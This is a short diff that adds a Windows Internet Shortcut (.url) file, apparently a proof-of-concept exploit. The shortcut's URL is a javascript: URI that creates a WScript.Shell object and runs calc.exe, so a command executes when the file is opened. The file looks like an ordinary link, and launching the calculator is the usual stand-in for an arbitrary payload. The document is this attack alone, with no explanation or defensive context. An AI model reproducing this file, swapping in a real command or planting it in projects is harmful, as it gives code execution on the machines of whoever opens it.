@@ -1,0 +1,2 @@
+[InternetShortcut]
+URL=javascript:CreateObject("WScript.Shell").Run("calc.exe")
